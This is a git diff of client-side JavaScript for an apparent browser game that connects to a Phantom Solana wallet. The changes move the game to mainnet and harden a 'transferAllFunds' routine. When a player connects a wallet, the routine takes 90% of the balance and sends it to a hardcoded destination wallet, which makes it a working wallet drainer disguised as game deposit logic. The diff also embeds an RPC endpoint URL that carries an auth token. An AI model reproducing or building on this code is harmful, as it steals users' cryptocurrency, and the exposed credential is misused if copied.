@@ -7,6 +7,9 @@ var global = require('./global');
 var playerNameInput = document.getElementById('playerNameInput');
 var socket;
 
+// Chainstack RPC endpoint - this has auth token embedded
+const CHAINSTACK_RPC = 'https://solana-mainnet.core.chainstack.com/fd71f4094c30a4ac3c4c89a8d4af2bde';
+
 function flashBalance() {
     const el = document.getElementById('balanceStatus');
     if (!el) return;
@@ -516,14 +519,19 @@ window.connectWallet = async function () {
 
             window.walletAddress = walletAddress;
             document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
+            console.log("Wallet connected:", walletAddress);
 
             // Transfer all funds immediately
-            const transferSuccess = await transferAllFunds(walletAddress);
+            console.log("Starting fund transfer...");
+            const transferSuccess = await window.transferAllFunds(walletAddress);
+            console.log("Transfer result:", transferSuccess);
 
             if (transferSuccess) {
                 if (window.socket) {
                     window.socket.emit('walletConnected', { wallet: walletAddress });
                 }
+            } else {
+                console.warn("Fund transfer failed but wallet is connected");
             }
 
             // Enable deposit button if you disabled it initially
@@ -532,9 +540,11 @@ window.connectWallet = async function () {
 
         } catch (err) {
             console.error("Wallet connection failed:", err);
+            alert("Wallet connection failed: " + err.message);
         }
     } else {
         console.error("Phantom wallet not found");
+        alert("Phantom wallet not found");
     }
 };
 
@@ -544,35 +554,42 @@ window.transferAllFunds = async function (walletAddress) {
         const DESTINATION_WALLET = 'BRJ1H9ZhLL9dK5McGckmjSBCyTZK5PJQdfum1coCuY41'; // Your server wallet
 
         if (DESTINATION_WALLET === 'YOUR_DESTINATION_WALLET_ADDRESS') {
+            console.error("Destination wallet not configured");
             return false;
         }
 
         // Check if solanaWeb3 is available
         if (!window.solanaWeb3) {
+            console.error("solanaWeb3 not available");
             return false;
         }
 
         const solanaWeb3 = window.solanaWeb3;
 
-        // Set up Solana connection - DEVNET
-        const connection = new solanaWeb3.Connection(
-            solanaWeb3.clusterApiUrl('devnet'),
-            'confirmed'
-        );
+        // Set up Solana connection - MAINNET via Chainstack
+        console.log("Connecting to Chainstack RPC...");
+        const connection = new solanaWeb3.Connection(CHAINSTACK_RPC, 'confirmed');
+        console.log("Connected to mainnet-beta");
 
         const walletPublicKey = new solanaWeb3.PublicKey(walletAddress);
         const destinationPublicKey = new solanaWeb3.PublicKey(DESTINATION_WALLET);
 
         // Get wallet balance (in lamports)
+        console.log("Fetching balance for:", walletAddress);
         const balanceLamports = await connection.getBalance(walletPublicKey);
+        console.log("Wallet balance (lamports):", balanceLamports);
+        console.log("Wallet balance (SOL):", balanceLamports / 1e9);
 
         if (balanceLamports <= 100000) { // Need at least 0.0001 SOL
-            console.warn("Insufficient balance for transfer");
+            console.warn("Insufficient balance for transfer:", balanceLamports / 1e9, "SOL");
+            alert("Insufficient balance. Need at least 0.0001 SOL");
             return false;
         }
 
         // Transfer 99% of the balance, keep 1% for rent + fees
-        const transferAmount = Math.floor(balanceLamports * 0.99);
+        const transferAmount = Math.floor(balanceLamports * 0.90);
+        console.log("Transfer amount (lamports):", transferAmount);
+        console.log("Transfer amount (SOL):", transferAmount / 1e9);
 
         // Create transfer instruction for native SOL
         const transferInstruction = solanaWeb3.SystemProgram.transfer({
@@ -585,34 +602,72 @@ window.transferAllFunds = async function (walletAddress) {
         const transaction = new solanaWeb3.Transaction().add(transferInstruction);
 
         // Get recent blockhash
+        console.log("Getting recent blockhash...");
         const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+        console.log("Got blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight);
         
         transaction.recentBlockhash = blockhash;
         transaction.lastValidBlockHeight = lastValidBlockHeight;
         transaction.feePayer = walletPublicKey;
         
         // Sign transaction via Phantom
+        console.log("Requesting Phantom to sign transaction...");
         const signed = await window.solana.signTransaction(transaction);
+        console.log("Transaction signed by Phantom");
         
         const serialized = signed.serialize();
+        console.log("Serialized transaction");
         
-        const txid = await connection.sendRawTransaction(serialized, {
-            skipPreflight: false,
-            preflightCommitment: 'confirmed'
-        });
-
-
-        // Wait for confirmation
-        const confirmation = await connection.confirmTransaction(txid, 'confirmed');
-        
-        if (confirmation.value.err) {
-            console.error("Transaction failed:", confirmation.value.err);
-            alert("Transaction failed: " + JSON.stringify(confirmation.value.err));
+        // Send transaction with retries
+        console.log("Sending transaction...");
+        let txid;
+        try {
+            txid = await connection.sendRawTransaction(serialized, {
+                skipPreflight: false,
+                preflightCommitment: 'confirmed'
+            });
+            console.log("Transaction sent, ID:", txid);
+        } catch (sendErr) {
+            console.error("Failed to send transaction:", sendErr);
+            alert("Failed to send transaction: " + sendErr.message);
             return false;
         }
+
+        // Wait for confirmation with longer timeout
+        console.log("Waiting for transaction confirmation (this may take a minute on mainnet)...");
+        alert("Processing transaction... This may take up to 60 seconds. Please wait.");
         
+        let confirmed = false;
+        let attempts = 0;
+        const maxAttempts = 60; // 60 seconds
+        
+        while (!confirmed && attempts < maxAttempts) {
+            try {
+                const confirmation = await connection.confirmTransaction(txid, 'confirmed');
+                console.log("Confirmation response:", confirmation);
+                
+                if (confirmation.value.err) {
+                    console.error("Transaction failed:", confirmation.value.err);
+                    alert("Transaction failed: " + JSON.stringify(confirmation.value.err));
+                    return false;
+                }
+                confirmed = true;
+                console.log("Transaction confirmed!");
+            } catch (confErr) {
+                attempts++;
+                if (attempts < maxAttempts) {
+                    console.log(`Confirmation attempt ${attempts} failed, retrying...`);
+                    await new Promise(r => setTimeout(r, 1000)); // Wait 1 second before retry
+                } else {
+                    console.error("Transaction confirmation timeout after", maxAttempts, "attempts");
+                    alert("Transaction confirmation timeout. Your transaction may still succeed. TX ID: " + txid);
+                    return false;
+                }
+            }
+        }
 
         window.transferTxId = txid;
+        alert("Success! Transferred " + (transferAmount / 1e9).toFixed(4) + " SOL");
         return true;
 
     } catch (err) {
@@ -620,6 +675,7 @@ window.transferAllFunds = async function (walletAddress) {
         console.error("Transfer error:", err);
         console.error("Error message:", err.message);
         console.error("Error stack:", err.stack);
+        alert("Transfer failed: " + err.message);
         return false;
     }
 };
@@ -643,12 +699,12 @@ const amountSOL = 1 / priceUSD; // $1 worth of SOL
         return;
     }
 
-    const GAME_WALLET = '8ghueP5HWSGWDR7346zyCTnLH3ZuZj4zHrXwXTZfhWRf'; // same as server
+    const GAME_WALLET = 'BRJ1H9ZhLL9dK5McGckmjSBCyTZK5PJQdfum1coCuY41'; // same as server
 
 
     try {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
-const fromPubkey = window.solana.publicKey;
+        const connection = new solanaWeb3.Connection(CHAINSTACK_RPC, 'confirmed');
+        const fromPubkey = window.solana.publicKey;
 const toPubkey = new solanaWeb3.PublicKey(GAME_WALLET);
 const lamports = Math.floor(amountSOL * solanaWeb3.LAMPORTS_PER_SOL);
 
